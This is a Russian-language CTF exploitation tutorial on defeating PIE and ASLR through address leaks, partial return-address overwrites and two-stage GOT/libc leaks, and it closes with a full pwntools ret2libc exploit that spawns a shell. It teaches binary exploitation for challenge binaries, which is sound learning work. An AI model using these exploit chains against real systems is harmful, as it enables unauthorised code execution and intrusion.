PIE (Position Independent Executable) компилирует бинарь в позиционно-независимый код: вместо фиксированных адресов используются смещения, а база образа рандомизируется ASLR при каждом запуске. Вместе с ASLR это ломает классический ret2win — адрес `win` неизвестен. Обход PIE сводится к двум вещам: получить утечку адреса (и вычислить базу) или использовать частичную перезапись (partial overwrite), не требующую знания базы.

## Что даёт PIE и как он выглядит

При сборке с `-pie -fPIC` код обращается к данным и функциям относительно `rip`, а загрузчик размещает образ по случайному адресу, выровненному на страницу. Митигации в `checksec`:

```
PIE:      PIE enabled
```

Проверить тип можно через `readelf -h ./chall | grep Type` — `DYN (Position-Independent Executable)` для PIE и `EXEC` для non-PIE. При PIE адрес функции в Ghidra — это смещение от базы; абсолютный адрес = `base + offset`. ASLR рандомизирует только базу; младшие 12 бит (offset внутри страницы) фиксированы.

## Стратегия 1: утечка базы кода

Если программа печатает адрес (например, `printf("%p", &func)`, или `puts` возвращает указатель), вычтите известное смещение и получите базу.

```python
from pwn import *
context.binary = elf = ELF('./chall')
p = process('./chall')
p.sendline(b'%7$p')                 # утечка адреса из стека
leak = int(p.recvline().strip(), 16)
base = leak - 0x1234                 # 0x1234 = offset в бинаре
elf.address = base
log.success(f'PIE base = {hex(base)}')
p.sendline(flat({72: elf.symbols['win']}))
p.interactive()
```

После `elf.address = base` все `elf.symbols[...]`, `elf.got[...]`, `elf.plt[...]` становятся абсолютными — дальше эксплойт пишется как для non-PIE.

## Стратегия 2: partial overwrite

Если ASLR рандомизирует только старшие биты, младшие 12 бит адреса возврата фиксированы. Можно переписать один-два младших байта сохранённого адреса, чтобы попасть в другую функцию в той же странице. Например, `main` возвращается в `__libc_start_main`, а мы переписываем младший байт так, чтобы вернуться в `win`, лежащий рядом.

```python
p.sendline(b'A'*72 + b'\x26')      # младший байт -> win (в той же странице)
```

Условие: целевая функция должна находиться в пределах 256 байт (для одного байта) от исходной точки возврата и не содержать нулевых байтов в младшем байте. Часто используют два байта (`\x26\x12`) для покрытия большего диапазона; тогда сохраняются старшие 6 байт.

## Стратегия 3: утечка через GOT (PIE + non-PIE libc)

Если libc не PIE (или PIE, но утечку дают через GOT), а бинарь PIE, сначала утекают базу кода, потом вызывают `puts@plt(puts@got)` уже по абсолютным адресам, затем утекают libc. Это двухступенчатая утечка.

```python
# шаг 1: утечка базы кода (например, через %p)
# шаг 2: ret2libc с абсолютными адресами
rop = ROP(elf)                     # elf.address уже установлен
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call(elf.symbols['main'])
```

## Частичная перезапись в 32-битных системах

В i386 адреса 4-байтовые, а ASLR рандомизирует 8-12 бит. Partial overwrite двух младших байтов работает чаще: сохраняются старшие 2 байта, а младшие меняются на нужные. Это популярный приём в задачах, где ввод обрезается или фильтрует нули.

## Взаимодействие с ASLR и утечками

ASLR рандомизирует: базу PIE-образа, базу libc, стек, кучу. Каждый регион независим. Поэтому утечка адреса стека не даёт базу libc. Но часто одна утечка (`%p`-цепочка или `puts`) раскрывает сразу несколько регионов — тогда вычисляйте каждый отдельно.

| Регион | Что утекает | Как |
|---|---|---|
| PIE-образ | база кода | `%p` на адрес функции, `puts` указателя |
| libc | база libc | `puts@plt(puts@got)` |
| стек | адрес стека | `%p` на `environ`/argv |
| куча | адрес кучи | `%p` на chunk |

## Отладка PIE

Под GDB адрес загрузки видно через `info proc mappings` или `vmmap`. Установите брейкпоинт по смещению: `b *($base + 0x1234)`. В pwndbg `$base` можно взять из `vmmap`. При повторных запусках база меняется — используйте `pwnlib.gdb` с `gdb.debug`, где pwntools сам считает базу.

```bash
gdb ./chall
(gdb) starti
(gdb) info proc mappings | grep chall
```

## Краевые случаи

- **`ld.so` тоже PIE.** Утечка через `_dl_runtime_resolve` даёт базу линкера, не libc.
- **Partial overwrite с неверным вторым байтом.** Попадёте в середину инструкции — краш; перебирайте байты или смотрите дизассемблер.
- **Нулевые байты в адресе.** Строковые функции обрывают запись; используйте `read`.
- **`elf.address` не сброшен.** Тогда `elf.symbols[...]` вернёт смещение и эксплойт уйдёт не туда.
- **Утечка обрезана `\n`/`\x00`.** Дополняйте `ljust(8, b'\x00')`.
- **BRK vs ET_DYN.** У некоторых загрузчиков база не выровнена на 0x1000 — проверяйте.

## Что дальше / решение

Дальше: `pwn-libc-database` (подбор версии libc по утечке), `pwn-ret2dlresolve` (вызов без утечки), `pwn-got-plt` (механика утечек). Практический алгоритм при PIE: (1) ищите любой вывод адреса — `%p`, `puts`, `write`; (2) вычислите базу вычитанием известного смещения; (3) установите `elf.address`; (4) пишите эксплойт как обычно. Если утечки нет — ищите partial overwrite или ret2dlresolve. PIE — это барьер только до первой утечки; после неё он неотличим от non-PIE.

## Утечка через printf, puts и write: практика

Разные функции дают утечку по-разному. `printf("%p")` печатает адреса из стека — это самый дешёвый способ, но позиции надо подбирать. `puts(addr)` печатает строку по адресу — если передать адрес функции, он выведет байты кода до `\x00`; это неудобно. `write(1, addr, 8)` печатает ровно 8 байт — идеально для утечки указателя. В задачах с PIE чаще всего ищут либо `%p`-утечку, либо `write`-примитив.

Если программа печатает адрес своей функции (например, «menu at 0x...»), это прямой подарок: вычтите смещение из дизассемблера и получите базу. Если печатает адрес `main`, а `main` в бинаре на смещении `0x1234`, база = `leak - 0x1234`. Всегда проверяйте, какой именно адрес печатается — `%p` может вернуть адрес libc или стека, а не кода.

## Полный эксплойт PIE + ASLR + NX

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')       # PIE
libc = ELF('./libc.so.6', checksec=False)
OFFSET = 72

def start():
    return process('./chall') if args.LOCAL else remote('host', 1337)

def exploit():
    p = start()
    # 1) утечка базы кода через %p
    p.recvuntil(b'name: ')
    p.sendline(b'%p')
    leak = int(p.recvline().strip(), 16)
    elf.address = leak - 0x1337             # offset функции из Ghidra
    log.success(f'PIE base = {hex(elf.address)}')
    # 2) утечка libc через puts@plt(puts@got) по абсолютным адресам
    rop = ROP(elf)
    rop.call(elf.plt['puts'], [elf.got['puts']])
    rop.call(elf.symbols['main'])
    p.sendlineafter(b'> ', flat({OFFSET: rop.chain()}))
    libc.address = u64(p.recvline().strip().ljust(8, b'\x00')) - libc.symbols['puts']
    # 3) финал
    rop2 = ROP(libc)
    rop2.call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))])
    p.sendlineafter(b'> ', flat({OFFSET: [ROP(elf).find_gadget(['ret']).address] + rop2.chain()}))
    p.interactive()

exploit()
```

Ключевой момент: после `elf.address = ...` все адреса в бинаре становятся абсолютными, и `ROP(elf)` работает как для non-PIE. Без этого шага `elf.plt['puts']` вернёт смещение, и цепочка уйдёт в мусор.

## Расширенные краевые случаи

- **Утечка адреса heap вместо кода.** `%p` может вернуть heap-указатель; его page offset не совпадёт с кодом — переберите позиции.
- **Несколько утечек сразу.** `%p.%p.%p` за один ввод даёт адреса стека, libc и кода; идентифицируйте их по диапазонам (`0x7f...` — libc/stack, `0x55...` — PIE heap/образ).
- **PIE + canary.** Сначала утечка canary, затем базы — обе через format string.
- **`__libc_start_main+243`.** Классическая утечка libc через `%p` на позиции, где лежит адрес возврата в libc.
- **BRK-раскладка.** Иногда база PIE выровнена на `0x1000`, иногда нет — проверяйте `& ~0xfff` только при уверенности.

## Таблица «что печатает %p»

| Диапазон адреса | Регион |
|---|---|
| `0x55...` / `0x56...` | PIE-образ / heap |
| `0x7f...` | libc, ld.so, стек |
| `0x7ff...` | стек |
| `0xffff...` | vsyscall |

## Сводка по обходу PIE

PIE ломает только статические адреса. Любая утечка — `%p`, `puts`, `write`, печать указателя — восстанавливает базу, после чего эксплойт пишется как для non-PIE. Если утечки нет, partial overwrite позволяет прыгнуть в пределах одной страницы без знания базы. В комбинации с ASLR сначала утекают базу кода, затем libc — это стандартный two-stage подход. Главное правило: не строить эксплойт до первой утечки, а планомерно её искать.
